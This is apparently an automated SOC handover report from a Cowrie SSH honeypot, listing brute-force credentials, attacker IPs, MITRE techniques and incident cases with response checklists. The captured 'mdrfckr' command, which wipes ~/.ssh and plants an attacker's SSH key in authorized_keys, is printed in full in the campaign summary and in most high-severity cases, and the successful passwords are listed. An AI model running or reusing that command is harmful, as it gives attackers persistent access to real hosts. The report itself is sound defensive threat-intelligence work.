# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T15:02:13Z |
| **Shift Time** | 15:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **65** |
| Confirmed Threats | **58** |
| False Positives Filtered | **7** (10.8%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **18** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **49** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **23** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 7 |
| `centos` | 2 |
| `user` | 2 |
| `GET / HTTP/1.1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `admin` | 4 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P` | `34.102.80.93` | 2026-03-30T14:10:03 |
| `root` | `Rose2026` | `89.190.156.113` | 2026-03-30T14:15:04 |
| `root` | `3245gs5662d34` | `89.190.156.113` | 2026-03-30T14:15:08 |
| `root` | `P@$$W0RD123!@#` | `117.173.77.121` | 2026-03-30T14:15:26 |
| `root` | `3245gs5662d34` | `117.173.77.121` | 2026-03-30T14:15:30 |
| `root` | `Qwerty123!` | `101.47.142.192` | 2026-03-30T14:23:15 |
| `root` | `3245gs5662d34` | `101.47.142.192` | 2026-03-30T14:23:18 |
| `root` | `1q2w3e...` | `112.217.188.122` | 2026-03-30T14:26:36 |
| `root` | `3245gs5662d34` | `112.217.188.122` | 2026-03-30T14:26:40 |
| `root` | `1234Abcd` | `112.221.175.214` | 2026-03-30T14:27:14 |
| `root` | `3245gs5662d34` | `112.221.175.214` | 2026-03-30T14:27:18 |
| `root` | `lk123456` | `69.12.83.203` | 2026-03-30T14:32:28 |
| `root` | `3245gs5662d34` | `69.12.83.203` | 2026-03-30T14:32:32 |
| `root` | `admin` | `116.110.145.92` | 2026-03-30T14:35:02 |
| `root` | `Aa1111111` | `180.138.194.82` | 2026-03-30T14:54:47 |
| `root` | `3245gs5662d34` | `180.138.194.82` | 2026-03-30T14:54:51 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.12.83.203`, `117.173.77.121`, `101.47.142.192`, `112.217.188.122`, `180.138.194.82`, `89.190.156.113`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 35 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-40746423e140

| Field | Detail |
|---|---|
| **Source IP** | `34.102.80[.]93` |
| **First Seen** | 2026-03-30 14:09 |
| **Last Seen** | 2026-03-30 14:10 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:09:53` | `cowrie.session.connect` |
| `2026-03-30 14:09:56` | `cowrie.client.version` |
| `2026-03-30 14:09:56` | `cowrie.client.kex` |
| `2026-03-30 14:10:03` | `cowrie.login.success` |
| `2026-03-30 14:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.102.80[.]93` to AbuseIPDB if not already reported
- [ ] Block `34.102.80[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6b9d1d94dd

| Field | Detail |
|---|---|
| **Source IP** | `89.190.156[.]113` |
| **First Seen** | 2026-03-30 14:15 |
| **Last Seen** | 2026-03-30 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:15:03` | `cowrie.session.connect` |
| `2026-03-30 14:15:03` | `cowrie.client.version` |
| `2026-03-30 14:15:03` | `cowrie.client.kex` |
| `2026-03-30 14:15:04` | `cowrie.login.success` |
| `2026-03-30 14:15:04` | `cowrie.session.params` |
| `2026-03-30 14:15:04` | `cowrie.command.input` |
| `2026-03-30 14:15:04` | `cowrie.command.failed` |
| `2026-03-30 14:15:04` | `cowrie.log.closed` |
| `2026-03-30 14:15:05` | `cowrie.session.params` |
| `2026-03-30 14:15:05` | `cowrie.command.input` |
| `2026-03-30 14:15:05` | `cowrie.session.file_download` |
| `2026-03-30 14:15:05` | `cowrie.log.closed` |
| `2026-03-30 14:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.190.156[.]113` to AbuseIPDB if not already reported
- [ ] Block `89.190.156[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad31ae85efc

| Field | Detail |
|---|---|
| **Source IP** | `89.190.156[.]113` |
| **First Seen** | 2026-03-30 14:15 |
| **Last Seen** | 2026-03-30 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:15:07` | `cowrie.session.connect` |
| `2026-03-30 14:15:07` | `cowrie.client.version` |
| `2026-03-30 14:15:07` | `cowrie.client.kex` |
| `2026-03-30 14:15:08` | `cowrie.login.success` |
| `2026-03-30 14:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.190.156[.]113` to AbuseIPDB if not already reported
- [ ] Block `89.190.156[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716c6c42102b

| Field | Detail |
|---|---|
| **Source IP** | `117.173.77[.]121` |
| **First Seen** | 2026-03-30 14:15 |
| **Last Seen** | 2026-03-30 14:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:15:25` | `cowrie.session.connect` |
| `2026-03-30 14:15:25` | `cowrie.client.version` |
| `2026-03-30 14:15:25` | `cowrie.client.kex` |
| `2026-03-30 14:15:26` | `cowrie.login.success` |
| `2026-03-30 14:15:26` | `cowrie.session.params` |
| `2026-03-30 14:15:26` | `cowrie.command.input` |
| `2026-03-30 14:15:26` | `cowrie.command.failed` |
| `2026-03-30 14:15:26` | `cowrie.log.closed` |
| `2026-03-30 14:15:27` | `cowrie.session.params` |
| `2026-03-30 14:15:27` | `cowrie.command.input` |
| `2026-03-30 14:15:27` | `cowrie.session.file_download` |
| `2026-03-30 14:15:27` | `cowrie.log.closed` |
| `2026-03-30 14:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.173.77[.]121` to AbuseIPDB if not already reported
- [ ] Block `117.173.77[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a3076f31422

| Field | Detail |
|---|---|
| **Source IP** | `117.173.77[.]121` |
| **First Seen** | 2026-03-30 14:15 |
| **Last Seen** | 2026-03-30 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:15:29` | `cowrie.session.connect` |
| `2026-03-30 14:15:29` | `cowrie.client.version` |
| `2026-03-30 14:15:30` | `cowrie.client.kex` |
| `2026-03-30 14:15:30` | `cowrie.login.success` |
| `2026-03-30 14:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.173.77[.]121` to AbuseIPDB if not already reported
- [ ] Block `117.173.77[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660526ed2af1

| Field | Detail |
|---|---|
| **Source IP** | `101.47.142[.]192` |
| **First Seen** | 2026-03-30 14:23 |
| **Last Seen** | 2026-03-30 14:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:23:15` | `cowrie.session.connect` |
| `2026-03-30 14:23:15` | `cowrie.client.version` |
| `2026-03-30 14:23:15` | `cowrie.client.kex` |
| `2026-03-30 14:23:15` | `cowrie.login.success` |
| `2026-03-30 14:23:16` | `cowrie.session.params` |
| `2026-03-30 14:23:16` | `cowrie.command.input` |
| `2026-03-30 14:23:16` | `cowrie.command.failed` |
| `2026-03-30 14:23:16` | `cowrie.log.closed` |
| `2026-03-30 14:23:16` | `cowrie.session.params` |
| `2026-03-30 14:23:16` | `cowrie.command.input` |
| `2026-03-30 14:23:16` | `cowrie.session.file_download` |
| `2026-03-30 14:23:16` | `cowrie.log.closed` |
| `2026-03-30 14:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.142[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.47.142[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4249b9e1bcf8

| Field | Detail |
|---|---|
| **Source IP** | `101.47.142[.]192` |
| **First Seen** | 2026-03-30 14:23 |
| **Last Seen** | 2026-03-30 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:23:17` | `cowrie.session.connect` |
| `2026-03-30 14:23:17` | `cowrie.client.version` |
| `2026-03-30 14:23:18` | `cowrie.client.kex` |
| `2026-03-30 14:23:18` | `cowrie.login.success` |
| `2026-03-30 14:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.142[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.47.142[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660f590fc2a4

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-03-30 14:26 |
| **Last Seen** | 2026-03-30 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:26:36` | `cowrie.session.connect` |
| `2026-03-30 14:26:36` | `cowrie.client.version` |
| `2026-03-30 14:26:36` | `cowrie.client.kex` |
| `2026-03-30 14:26:36` | `cowrie.login.success` |
| `2026-03-30 14:26:37` | `cowrie.session.params` |
| `2026-03-30 14:26:37` | `cowrie.command.input` |
| `2026-03-30 14:26:37` | `cowrie.command.failed` |
| `2026-03-30 14:26:37` | `cowrie.log.closed` |
| `2026-03-30 14:26:37` | `cowrie.session.params` |
| `2026-03-30 14:26:37` | `cowrie.command.input` |
| `2026-03-30 14:26:37` | `cowrie.session.file_download` |
| `2026-03-30 14:26:37` | `cowrie.log.closed` |
| `2026-03-30 14:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83ffece610d

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-03-30 14:26 |
| **Last Seen** | 2026-03-30 14:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:26:39` | `cowrie.session.connect` |
| `2026-03-30 14:26:39` | `cowrie.client.version` |
| `2026-03-30 14:26:40` | `cowrie.client.kex` |
| `2026-03-30 14:26:40` | `cowrie.login.success` |
| `2026-03-30 14:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10aa22721554

| Field | Detail |
|---|---|
| **Source IP** | `112.221.175[.]214` |
| **First Seen** | 2026-03-30 14:27 |
| **Last Seen** | 2026-03-30 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:27:14` | `cowrie.session.connect` |
| `2026-03-30 14:27:14` | `cowrie.client.version` |
| `2026-03-30 14:27:14` | `cowrie.client.kex` |
| `2026-03-30 14:27:14` | `cowrie.login.success` |
| `2026-03-30 14:27:15` | `cowrie.session.params` |
| `2026-03-30 14:27:15` | `cowrie.command.input` |
| `2026-03-30 14:27:15` | `cowrie.command.failed` |
| `2026-03-30 14:27:15` | `cowrie.log.closed` |
| `2026-03-30 14:27:15` | `cowrie.session.params` |
| `2026-03-30 14:27:15` | `cowrie.command.input` |
| `2026-03-30 14:27:15` | `cowrie.session.file_download` |
| `2026-03-30 14:27:15` | `cowrie.log.closed` |
| `2026-03-30 14:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.221.175[.]214` to AbuseIPDB if not already reported
- [ ] Block `112.221.175[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f3b0faebccc

| Field | Detail |
|---|---|
| **Source IP** | `112.221.175[.]214` |
| **First Seen** | 2026-03-30 14:27 |
| **Last Seen** | 2026-03-30 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:27:17` | `cowrie.session.connect` |
| `2026-03-30 14:27:17` | `cowrie.client.version` |
| `2026-03-30 14:27:17` | `cowrie.client.kex` |
| `2026-03-30 14:27:18` | `cowrie.login.success` |
| `2026-03-30 14:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.221.175[.]214` to AbuseIPDB if not already reported
- [ ] Block `112.221.175[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f665889ef51

| Field | Detail |
|---|---|
| **Source IP** | `69.12.83[.]203` |
| **First Seen** | 2026-03-30 14:32 |
| **Last Seen** | 2026-03-30 14:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:32:27` | `cowrie.session.connect` |
| `2026-03-30 14:32:27` | `cowrie.client.version` |
| `2026-03-30 14:32:27` | `cowrie.client.kex` |
| `2026-03-30 14:32:28` | `cowrie.login.success` |
| `2026-03-30 14:32:28` | `cowrie.session.params` |
| `2026-03-30 14:32:28` | `cowrie.command.input` |
| `2026-03-30 14:32:28` | `cowrie.command.failed` |
| `2026-03-30 14:32:28` | `cowrie.log.closed` |
| `2026-03-30 14:32:29` | `cowrie.session.params` |
| `2026-03-30 14:32:29` | `cowrie.command.input` |
| `2026-03-30 14:32:29` | `cowrie.session.file_download` |
| `2026-03-30 14:32:29` | `cowrie.log.closed` |
| `2026-03-30 14:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.12.83[.]203` to AbuseIPDB if not already reported
- [ ] Block `69.12.83[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5916318a20

| Field | Detail |
|---|---|
| **Source IP** | `69.12.83[.]203` |
| **First Seen** | 2026-03-30 14:32 |
| **Last Seen** | 2026-03-30 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:32:31` | `cowrie.session.connect` |
| `2026-03-30 14:32:31` | `cowrie.client.version` |
| `2026-03-30 14:32:31` | `cowrie.client.kex` |
| `2026-03-30 14:32:32` | `cowrie.login.success` |
| `2026-03-30 14:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.12.83[.]203` to AbuseIPDB if not already reported
- [ ] Block `69.12.83[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa444082b51c

| Field | Detail |
|---|---|
| **Source IP** | `116.110.145[.]92` |
| **First Seen** | 2026-03-30 14:35 |
| **Last Seen** | 2026-03-30 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 14:35:01` | `cowrie.session.connect` |
| `2026-03-30 14:35:02` | `cowrie.client.version` |
| `2026-03-30 14:35:02` | `cowrie.client.kex` |
| `2026-03-30 14:35:02` | `cowrie.login.success` |
| `2026-03-30 14:35:02` | `cowrie.direct-tcpip.request` |
| `2026-03-30 14:35:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-30 14:35:02` | `cowrie.direct-tcpip.data` |
| `2026-03-30 14:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.145[.]92` to AbuseIPDB if not already reported
- [ ] Block `116.110.145[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc098fa364f9

| Field | Detail |
|---|---|
| **Source IP** | `180.138.194[.]82` |
| **First Seen** | 2026-03-30 14:54 |
| **Last Seen** | 2026-03-30 14:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
